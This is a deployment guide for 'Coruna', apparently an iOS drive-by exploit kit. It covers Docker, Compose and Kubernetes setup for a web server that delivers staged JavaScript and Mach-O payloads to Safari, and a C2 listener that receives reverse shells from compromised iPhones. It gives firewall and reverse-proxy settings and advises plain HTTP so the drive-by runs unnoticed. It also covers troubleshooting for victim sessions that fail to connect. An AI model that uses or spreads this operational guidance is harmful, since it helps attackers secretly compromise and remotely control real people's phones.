# Docker Deployment Guide — Coruna iOS Orchestrator

This guide details how to build, deploy, configure, and operate the **Coruna iOS Orchestrator** using Docker and Docker Compose in both interactive and automated/daemon environments.

---

## Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Quick Start](#quick-start)
   - [Using Docker Compose (Recommended)](#using-docker-compose-recommended)
   - [Using Standard Docker CLI](#using-standard-docker-cli)
3. [Interactive Console vs Daemon Mode](#interactive-console-vs-daemon-mode)
   - [Running Interactively](#running-interactively)
   - [Running as a Background Daemon](#running-as-a-background-daemon)
   - [Attaching to a Running Daemon](#attaching-to-a-running-daemon)
4. [Container Security & Non-Root Execution](#container-security--non-root-execution)
5. [Configuration & Environment Variables](#configuration-and-environment-variables)
6. [Volumes & Custom Payloads](#volumes-and-custom-payloads)
7. [VPS & Production Deployment](#vps-and-production-deployment)
   - [Firewall Configuration](#firewall-configuration)
   - [Port 80 HTTP Notice for iOS Targets](#port-80-http-notice-for-ios-targets)
   - [Reverse Proxy Setup (Nginx Example)](#reverse-proxy-setup-nginx-example)
8. [Kubernetes Deployment](#kubernetes-deployment)
9. [Troubleshooting & Healthchecks](#troubleshooting-and-healthchecks)

---

## Architecture Overview

Inside the Docker container:
- **Web Exploit Server** (`aiohttp`): Serves `/coruna/group.html`, Stage 1/2/3 JavaScript modules, and Mach-O payloads. Default container port: **80**.
- **C2 Server** (`asyncio.start_server`): Accepts inbound TCP reverse shells from compromised devices. Default container port: **8080**.
- **User / Security Context**: Runs as unprivileged user `coruna` (UID `10001`), utilizing Linux capabilities (`cap_net_bind_service`) to bind to port 80 without root access.

```
                    ┌──────────────────────────────────────────────┐
                    │            Docker Host / VPS                 │
                    │                                              │
Victim iPhone       │    Port 80/TCP            Port 8080/TCP      │
(Safari) ───────────┼───────────►                  ▲               │
                    │           │                  │               │
                    │   ┌───────▼──────────────────┴───────────┐   │
                    │   │        coruna Container              │   │
                    │   │                                      │   │
                    │   │   Web Server        C2 Listener      │   │
                    │   │   (aiohttp)        (TCP Socket)      │   │
                    │   │   Port: 80         Port: 8080        │   │
                    │   │       │                │             │   │
Operator Console ───┼───┼───────┴────────┬───────┴─────────┐   │   │
(Interactive TTY)   │   │                ▼                 │   │   │
                    │   │      Interactive Console         │   │   │
                    │   │    (list / use <id> / quit)      │   │   │
                    │   └──────────────────────────────────┘   │
                    └──────────────────────────────────────────┘
```

---

## Quick Start

### Using Docker Compose (Recommended)

1. **Clone the repository**:
   ```bash
   git clone https://github.com/bhideki/coruna.git
   cd coruna
   ```

2. **Launch the stack in the background**:
   ```bash
   docker compose up -d --build
   ```

3. **Check container status**:
   ```bash
   docker compose ps
   ```

4. **View logs**:
   ```bash
   docker compose logs -f
   ```

5. **Stop the container**:
   ```bash
   docker compose down
   ```

---

### Using Standard Docker CLI

1. **Build the Docker image**:
   ```bash
   docker build -t coruna:latest .
   ```

2. **Run container in daemon mode**:
   ```bash
   docker run -d \
     --name coruna \
     -p 80:80 \
     -p 8080:8080 \
     --restart unless-stopped \
     coruna:latest
   ```

3. **Verify the container is healthy**:
   ```bash
   docker ps
   ```

---

## Interactive Console vs Daemon Mode

Coruna can operate in two execution modes:

### 1. Running Interactively

To interact directly with the C2 console (`(coruna)> list`, `(coruna)> use <id>`):

**Using Docker Compose**:
```bash
# Start directly into an interactive session
docker compose run --rm coruna
```

**Using Docker CLI**:
```bash
docker run -it --rm \
  -p 80:80 \
  -p 8080:8080 \
  coruna:latest
```

You will see:
```text
[*] Exploit Web Server listening on http://0.0.0.0:80...
[*] Coruna running. Open http://<SERVER_IP>/ in Safari on your iPhone
[*] Commands: list | use <id> | help | quit
[*] C2 listening on 0.0.0.0:8080

(coruna)> 
```

### 2. Running as a Background Daemon

When running with `docker compose up -d` or `docker run -d`, Coruna automatically detects that standard input is not a TTY and transitions into daemon mode without crashing:

```text
[*] Daemon / non-interactive mode active. Web server and C2 waiting for connections...
[*] Press Ctrl+C or send SIGTERM to stop.
```

To explicitly force daemon mode even in interactive environments, set:
```bash
CORUNA_HEADLESS=1
```

### 3. Attaching to a Running Daemon

If the container was started in the background with `stdin_open: true` and `tty: true` (as configured in `docker-compose.yml`), you can attach to the live console at any time:

```bash
docker attach coruna
```

> [!TIP]
> To detach from the container without stopping it, use the Docker detach key sequence: `Ctrl+P` followed by `Ctrl+Q`.

---

## Container Security & Non-Root Execution

The Dockerfile is hardened according to container security best practices:

- **Non-root application user**: Runs as user `coruna` (UID `10001`, GID `10001`).
- **Minimal attack surface**: Built upon `python:3.11-slim`, discarding unnecessary build tools after installation.
- **Privileged port binding**: Standard Linux kernels restrict ports below `1024` to the root user. Instead of running as root, the image applies `setcap 'cap_net_bind_service=+ep'` to the Python binary. This allows `coruna` to bind to port 80 while retaining complete unprivileged isolation.
- **Read-only filesystem compatibility**: The configuration manager automatically falls back gracefully if the root filesystem is mounted read-only.

---

## Configuration & Environment Variables

Coruna supports 12-factor configuration through environment variables, taking precedence over `config.json`.

| Variable | Description | Default |
|---|---|---|
| `WEB_SERVER_IP` | Bind address for exploit web server | `0.0.0.0` |
| `WEB_SERVER_PORT` | Port for exploit web server | `80` |
| `C2_BIND` | Bind address for C2 TCP listener | `0.0.0.0` |
| `C2_PORT` | Port for C2 TCP listener | `8080` |
| `EXPLOIT_TEMPLATES_DIR` | Directory containing exploit chains (`coruna/`) | `exploits/` |
| `STATIC_FILES_DIR` | Directory containing static assets | `web_server/static/` |
| `CORUNA_HEADLESS` | Force headless/daemon mode (`1` = yes, `0` = auto) | `0` (auto-detects TTY) |

You can specify these variables directly in `docker-compose.yml`, via a `.env` file, or on the command line:

```bash
docker run -d \
  -e WEB_SERVER_PORT=8000 \
  -e C2_PORT=9090 \
  -p 80:8000 \
  -p 9090:9090 \
  coruna:latest
```

---

## Volumes & Custom Payloads

To persist custom exploit payloads or override configuration files without rebuilding the container:

### 1. Mounting Custom Payloads
```yaml
volumes:
  - ./exploits:/app/exploits
```
This enables real-time updates to `exploits/coruna/payloads/` (e.g. updating `bootstrap.dylib` or adding hash-specific dylibs).

### 2. Mounting External Configuration
```yaml
volumes:
  - ./config.json:/app/config.json:ro
```

---

## VPS & Production Deployment

### Firewall Configuration

Ensure both ports **80** (HTTP) and **8080** (TCP) are open in your host/cloud firewall (AWS Security Groups, DigitalOcean Cloud Firewall, UFW, etc.):

```bash
# Ubuntu UFW example
sudo ufw allow 80/tcp comment "Coruna Web Exploit Server"
sudo ufw allow 8080/tcp comment "Coruna C2 Listener"
sudo ufw reload
```

### Port 80 HTTP Notice for iOS Targets

> [!IMPORTANT]
> iOS Safari requires **plain HTTP** on port 80 for this drive-by delivery chain. If HTTPS is enforced, Safari displays TLS certificate warnings that break the transparent drive-by execution. Do not enforce HTTPS redirection for the exploit URL.

### Reverse Proxy Setup (Nginx Example)

If your VPS hosts other services, you can reverse-proxy the exploit server:

```nginx
server {
    listen 80;
    server_name exploit.yourdomain.com;

    location / {
        proxy_pass http://127.0.0.1:80;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;

        # Ensure correct JavaScript MIME type for Safari
        proxy_hide_header Content-Type;
        add_header Content-Type "application/javascript; charset=utf-8" always;
    }
}
```

> [!NOTE]
> The C2 port (**8080**) uses raw TCP sockets, not HTTP. Do not proxy port 8080 through standard HTTP reverse proxies; forward it directly or use an Nginx stream block:

```nginx
stream {
    server {
        listen 8080;
        proxy_pass 127.0.0.1:8080;
    }
}
```

---

## Kubernetes Deployment

For Kubernetes environments, deploy Coruna using the following manifest:

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: coruna
  labels:
    app: coruna
spec:
  replicas: 1
  selector:
    matchLabels:
      app: coruna
  template:
    metadata:
      labels:
        app: coruna
    spec:
      containers:
        - name: coruna
          image: coruna:latest
          imagePullPolicy: IfNotPresent
          env:
            - name: WEB_SERVER_PORT
              value: "80"
            - name: C2_PORT
              value: "8080"
            - name: CORUNA_HEADLESS
              value: "1"
          ports:
            - name: http-web
              containerPort: 80
            - name: tcp-c2
              containerPort: 8080
          securityContext:
            runAsNonRoot: true
            runAsUser: 10001
            capabilities:
              add: ["NET_BIND_SERVICE"]
          readinessProbe:
            httpGet:
              path: /coruna/group.html
              port: 80
            initialDelaySeconds: 5
            periodSeconds: 10
          livenessProbe:
            httpGet:
              path: /coruna/group.html
              port: 80
            initialDelaySeconds: 15
            periodSeconds: 20
---
apiVersion: v1
kind: Service
metadata:
  name: coruna-service
spec:
  type: LoadBalancer
  selector:
    app: coruna
  ports:
    - name: http-web
      port: 80
      targetPort: 80
    - name: tcp-c2
      port: 8080
      targetPort: 8080
```

---

## Troubleshooting & Healthchecks

### Verify Container Health
```bash
# Check status in docker ps
docker ps --filter "name=coruna"

# View healthcheck status and raw output
docker inspect --format='{{json .State.Health}}' coruna | jq
```

### Manually Test Endpoints Inside Container
```bash
# Test HTTP Web Server
docker exec -it coruna python3 -c "import urllib.request; print(urllib.request.urlopen('http://127.0.0.1:80/coruna/group.html').getcode())"

# Test C2 Socket
docker exec -it coruna python3 -c "import socket; s = socket.socket(); s.connect(('127.0.0.1', 8080)); print('C2 Connected'); s.close()"
```

### Common Issues

1. **`PermissionError: [Errno 13] Permission denied` on port 80**:
   - Ensure the image was built using the provided `Dockerfile` containing `setcap 'cap_net_bind_service=+ep'`.
   - Alternatively, configure an unprivileged port via `-e WEB_SERVER_PORT=8000 -p 80:8000`.

2. **Container exits immediately on startup**:
   - Check if `CORUNA_HEADLESS=1` is set or if stdin is detached. Coruna includes automatic non-TTY detection, but setting `CORUNA_HEADLESS=1` guarantees daemon execution.

3. **Victim device loads page but no C2 session connects**:
   - Verify that port `8080` is routed to the host and reachable externally.
   - Confirm `payloads/bootstrap.dylib` exists in `exploits/coruna/payloads/`.
